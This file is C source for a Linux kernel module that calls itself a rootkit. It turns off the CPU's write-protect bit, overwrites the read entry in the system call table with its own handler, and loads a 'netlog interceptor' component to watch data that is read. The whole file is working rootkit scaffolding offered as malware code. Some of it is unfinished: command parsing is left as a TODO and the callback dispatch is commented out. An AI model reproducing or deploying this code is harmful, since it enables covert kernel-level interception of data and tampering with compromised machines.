#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_getdents */
#include <linux/namei.h>		/* Needed for kern_path & LOOKUP_FOLLOW */
#include <linux/ctype.h>
#include <linux/list.h>
#include <linux/slab.h>


#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */
#include "core.h"

#include "netlog_interceptor.h"

#define MOD_NAME "core"

MODULE_LICENSE("GPL");

static void disable_write_protect_mode(void);
static void enable_write_protect_mode(void);

asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count);

struct rootkit_data *rk;

static void init_rootkit_data(struct rootkit_data **data)
{
	*data = kzalloc(sizeof(struct rootkit_data), GFP_KERNEL);
	INIT_LIST_HEAD(&(*data)->read_syscall_instrumenters);

}

static void load_modules(void)
{
	printk(KERN_INFO MSG_PREF(MOD_NAME)"loading modules...\n");

	/* NetLog-Interceptor */
	interceptor_init(&(rk->original_syscalls));

	printk(KERN_INFO MSG_PREF(MOD_NAME)"module loading finished\n");
}

static int __init rootkit_start(void)
{
	rk = NULL;

	/* Initialize the rootkit structure */
	init_rootkit_data(&rk);

	disable_write_protect_mode();

	rk->syscall_table = (void *) ROOTKIT_SYS_CALL_TABLE;
	rk->original_syscalls.read_syscall = (void *) rk->syscall_table[__NR_read];
	rk->syscall_table[__NR_read] = my_read_syscall;

	enable_write_protect_mode();

	load_modules();

	printk(KERN_INFO MSG_PREF(MOD_NAME)"Hello :)\n");

	return 0;
}

void register_read_instrumenter(asmlinkage long (*callback)(unsigned int fd, char __user *buf, size_t count, long ret))
{
	struct read_syscall_instrumenter *rsi = kzalloc(sizeof(struct read_syscall_instrumenter), GFP_KERNEL);
	rsi->callback = callback;
	list_add(&(rsi->list), &(rk->read_syscall_instrumenters));
}

void deregister_read_instrumenter(asmlinkage long (*callback)(unsigned int fd, char __user *buf, size_t count, long ret))
{
	struct read_syscall_instrumenter *rsi = NULL;

	list_for_each_entry(rsi, &(rk->read_syscall_instrumenters), list)
		if (rsi->callback == callback) {
			list_del(&(rsi->list));
			break;
		}
}

static void unload_modules(void)
{
	printk(KERN_INFO MSG_PREF(MOD_NAME)"unloading modules...\n");

	/* Interceptor-Netlogger */
	interceptor_exit();

	printk(KERN_INFO MSG_PREF(MOD_NAME)"module unloading finished\n");
}

static void delete_rootkit_data(struct rootkit_data *data)
{
	kfree(data);
}

static void __exit rootkit_exit(void)
{
	disable_write_protect_mode();

	/* Restore original syscalls */
	//sys_call_table[__NR_getdents] = (int *) getdents_syscall;
	rk->syscall_table[__NR_read] = rk->original_syscalls.read_syscall;

	enable_write_protect_mode();

	unload_modules();
	delete_rootkit_data(rk);

	printk(KERN_INFO MSG_PREF(MOD_NAME)"successfully removed\n");

}

static void disable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~0x00010000);
}

static void enable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 1. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 | 0x00010000);
}

/*
long call_each(unsigned int fd, char __user *buf, size_t count, long ret)
{
	struct read_syscall_instrumenters *rsi;
	
	list_for_each_entry(rsi, &(rk->read_syscall_instrumenters), list);
		ret = rsi->callback(fd, buf, count, ret);
}
*/

asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
{
	long ret;
	struct read_syscall_intrumenter *rsi;
	struct list_head *p;

	/* TODO insert command parsing logic here: */

	/* Call original read_syscall */
	ret = rk->original_syscalls.read_syscall(fd, buf, count);

	/* Call all registered instrumenters */
	//list_for_each_entry(rsi, &rk->read_syscall_instrumenters, list);
	//		ret = rsi->callback(fd, buf, count, ret);

//	list_for_each(p, &(rk->read_syscall_instrumenters)) {
//		rsi = list_entry(p, struct read_syscall_instrumenter, list);
//		ret = rsi->callback(fd, buf, count, ret);
//	}

	return ret;
}

module_init(rootkit_start);
module_exit(rootkit_exit);
